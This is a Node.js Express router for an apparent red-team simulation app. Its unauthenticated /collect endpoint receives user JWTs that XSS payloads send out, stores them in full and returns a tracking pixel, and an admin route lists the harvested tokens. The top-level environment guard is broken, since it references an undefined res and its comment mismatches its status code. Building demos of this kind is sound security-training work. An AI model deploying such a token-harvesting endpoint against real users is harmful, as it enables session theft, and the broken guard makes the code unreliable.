const express      = require('express');
const router       = express.Router();
const { writeLog } = require('../utils/logStore');
// FIX (CRITICAL): import auth middleware to protect all redteam endpoints
const { protect, adminOnly } = require('../middleware/authMiddleware');

// FIX (CRITICAL): NODE_ENV guard — if this file is ever accidentally mounted in
// production, every route returns 404 immediately. Remove this guard only in
// development/test environments.
if (process.env.ENABLE_REDTEAM !== 'true'){
     return res.status(403).json({ message: 'Red team routes are disabled. Set ENABLE_REDTEAM=true to enable.' });
  module.exports = router;
  // eslint-disable-next-line no-process-exit
  return; // Nothing below runs in production
}

let attackSessions  = [];
let collectedTokens = [];

// NOTE: This route is intentionally placed BEFORE router.use(protect, adminOnly).
// XSS payloads firing in victim browsers cannot include admin JWTs — they call this
// endpoint with just the victim's token as a query param. The sensitive read endpoints
// (/tokens, /sessions) remain protected by adminOnly below.
router.get('/collect', (req, res) => {
  const { token } = req.query;
  if (token && token !== 'null') {
    collectedTokens.unshift({
      token:     token.substring(0, 50) + '...',
      fullToken: token,
      timestamp: new Date().toISOString(),
      ip:        req.ip,
    });
    if (collectedTokens.length > 50) collectedTokens = collectedTokens.slice(0, 50);
    writeLog({
      event:        'XSS_TOKEN_HARVESTED',
      severity:     'CRITICAL',
      outcome:      'STOLEN',
      ip:           req.ip,
      tokenPreview: token.substring(0, 30) + '...',
      mode:         process.env.APP_MODE,
    });
    console.log(`💀 [RED TEAM] Token harvested: ${token.substring(0, 30)}...`);
  }
  const gif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
  res.writeHead(200, { 'Content-Type': 'image/gif' });
  res.end(gif);
});

// FIX (CRITICAL): All routes now require a valid JWT AND admin role.
// Previously every route was completely open — /api/redteam/tokens returned
// all harvested JWTs to any anonymous caller.
router.use(protect, adminOnly);

router.post('/start', (req, res) => {
  const session = {
    id:        `session-${Date.now()}`,
    startTime: new Date().toISOString(),
    phases:    [],
    mode:      process.env.APP_MODE,
    ip:        req.ip,
  };
  attackSessions.unshift(session);
  if (attackSessions.length > 20) attackSessions = attackSessions.slice(0, 20);
  writeLog({
    event:   'RED_TEAM_SIMULATION_STARTED',
    severity: 'INFO',
    outcome:  'STARTED',
    ip:       req.ip,
    mode:     process.env.APP_MODE,
  });
  res.json({ success: true, sessionId: session.id });
});

router.post('/phase', (req, res) => {
  const { sessionId, phase, success, details } = req.body;
  const phaseRecord = {
    phase,
    success,
    details,
    timestamp: new Date().toISOString(),
    mode: process.env.APP_MODE,
  };
  const session = attackSessions.find(s => s.id === sessionId);
  if (session) session.phases.push(phaseRecord);
  writeLog({
    event:   `ATTACK_PHASE_${phase?.toUpperCase().replace(/\s/g, '_')}`,
    severity: success ? 'HIGH' : 'LOW',
    outcome:  success ? 'SUCCEEDED' : 'BLOCKED',
    ip:       req.ip,
    mode:     process.env.APP_MODE,
    details,
  });
  res.json({ success: true, phaseRecord });
});


// FIX (CRITICAL): /tokens previously returned all harvested JWTs to anyone.
// Now protected by router-level adminOnly above.
router.get('/tokens',   (req, res) => res.json({ success: true, count: collectedTokens.length, tokens: collectedTokens }));
router.get('/sessions', (req, res) => res.json({ success: true, count: attackSessions.length,  sessions: attackSessions }));
router.delete('/reset', (req, res) => {
  attackSessions  = [];
  collectedTokens = [];
  res.json({ success: true, message: 'Red team data cleared' });
});

module.exports = router;